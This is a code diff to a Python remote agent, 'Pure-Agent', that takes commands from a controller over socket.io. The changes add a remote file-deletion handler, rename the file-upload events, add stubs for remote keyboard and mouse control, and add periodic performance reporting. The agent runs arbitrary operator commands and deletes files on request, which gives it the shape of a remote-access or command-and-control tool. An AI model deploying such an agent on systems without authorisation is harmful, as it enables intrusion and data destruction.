@@ -279,7 +279,7 @@ def connect():
         'name': f'Pure-Agent-{AGENT_INFO["hostname"]}',
         'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
         'ip': 'Auto-detected',
-        'capabilities': ['commands', 'files', 'system_info', 'process_management'],
+        'capabilities': ['commands', 'files', 'system_info', 'process_management', 'performance_monitoring'],
         'cpu_usage': system_info.get('cpu_usage', 0),
         'memory_usage': system_info.get('memory_percent', 0),
         'network_usage': 0,
@@ -324,8 +324,25 @@ def on_command(data):
         
         log(f"📨 Received 'command' event: {command} (execution_id: {execution_id})")
         
-        # Execute command
-        output = execute_command(command)
+        # Handle special UI commands
+        if command.startswith('list-dir:'):
+            path = command[9:].strip() or '/'
+            output = execute_command(f'list-files {path}')
+        elif command.startswith('delete-file:'):
+            path = command[12:].strip()
+            try:
+                path_obj = Path(path)
+                if path_obj.is_dir():
+                    import shutil
+                    shutil.rmtree(path_obj)
+                else:
+                    path_obj.unlink()
+                output = f"Deleted: {path}"
+            except Exception as e:
+                output = f"Error deleting {path}: {str(e)}"
+        else:
+            # Execute normal command
+            output = execute_command(command)
         
         # Send result back to controller using command_result event
         sio.emit('command_result', {
@@ -360,8 +377,25 @@ def on_execute_command(data):
         
         log(f"Received execute_command: {command}")
         
-        # Execute command
-        output = execute_command(command)
+        # Handle special UI commands
+        if command.startswith('list-dir:'):
+            path = command[9:].strip() or '/'
+            output = execute_command(f'list-files {path}')
+        elif command.startswith('delete-file:'):
+            path = command[12:].strip()
+            try:
+                path_obj = Path(path)
+                if path_obj.is_dir():
+                    import shutil
+                    shutil.rmtree(path_obj)
+                else:
+                    path_obj.unlink()
+                output = f"Deleted: {path}"
+            except Exception as e:
+                output = f"Error deleting {path}: {str(e)}"
+        else:
+            # Execute normal command
+            output = execute_command(command)
         
         # Send result back
         sio.emit('command_result', {
@@ -683,9 +717,9 @@ def on_request_file_chunk(data):
     except Exception as e:
         log(f"Error downloading file: {e}")
 
-@sio.on('upload_file_chunk')
-def on_upload_file_chunk(data):
-    """Receive file upload chunk"""
+@sio.on('file_chunk_from_operator')
+def on_file_chunk_from_operator(data):
+    """Receive file upload chunk from operator (UI sends this)"""
     try:
         agent_id = data.get('agent_id', '')
         if agent_id and agent_id != AGENT_ID:
@@ -716,8 +750,8 @@ def on_upload_file_chunk(data):
     except Exception as e:
         log(f"Error uploading file chunk: {e}")
 
-@sio.on('upload_file_end')
-def on_upload_file_end(data):
+@sio.on('file_upload_complete_from_operator')
+def on_file_upload_complete(data):
     """File upload complete"""
     try:
         agent_id = data.get('agent_id', '')
@@ -1114,6 +1148,69 @@ def status_update():
             log(f"Status update error: {e}")
             time.sleep(60)
 
+# ═══════════════════════════════════════════════════════════════════
+# REMOTE CONTROL HANDLERS (For UI v2.1)
+# ═══════════════════════════════════════════════════════════════════
+
+@sio.on('key_press')
+def on_key_press(data):
+    """Handle remote key press - NOT AVAILABLE in pure agent"""
+    try:
+        key = data.get('key', '')
+        log(f"Remote key press requested: {key}")
+        sio.emit('command_result', {
+            'agent_id': AGENT_ID,
+            'output': 'Remote control not available in pure agent (requires pynput/keyboard libraries)',
+            'success': False,
+            'timestamp': time.time()
+        })
+    except Exception as e:
+        log(f"Error handling key_press: {e}")
+
+@sio.on('mouse_move')
+def on_mouse_move(data):
+    """Handle remote mouse move - NOT AVAILABLE in pure agent"""
+    try:
+        x = data.get('x', 0)
+        y = data.get('y', 0)
+        log(f"Remote mouse move requested: ({x}, {y})")
+        # Pure agent doesn't support remote control
+    except Exception as e:
+        log(f"Error handling mouse_move: {e}")
+
+@sio.on('mouse_click')
+def on_mouse_click(data):
+    """Handle remote mouse click - NOT AVAILABLE in pure agent"""
+    try:
+        button = data.get('button', 'left')
+        log(f"Remote mouse click requested: {button}")
+        # Pure agent doesn't support remote control
+    except Exception as e:
+        log(f"Error handling mouse_click: {e}")
+
+# ═══════════════════════════════════════════════════════════════════
+# PERFORMANCE & STATUS UPDATES
+# ═══════════════════════════════════════════════════════════════════
+
+def performance_update():
+    """Send periodic performance updates to controller"""
+    while True:
+        try:
+            if sio.connected:
+                info = get_system_info()
+                sio.emit('performance_update', {
+                    'agent_id': AGENT_ID,
+                    'cpu': info.get('cpu_usage', 0),
+                    'memory': info.get('memory_percent', 0),
+                    'disk': info.get('disk_percent', 0),
+                    'network': 0,
+                    'timestamp': time.time()
+                })
+            time.sleep(15)  # Update every 15 seconds
+        except Exception as e:
+            log(f"Performance update error: {e}")
+            time.sleep(15)
+
 def main():
     """Main entry point"""
     log("=" * 70)
@@ -1170,6 +1267,9 @@ def main():
     
     status_thread = threading.Thread(target=status_update, daemon=True)
     status_thread.start()
+    
+    performance_thread = threading.Thread(target=performance_update, daemon=True)
+    performance_thread.start()
     
     # Connect to controller
     while True:
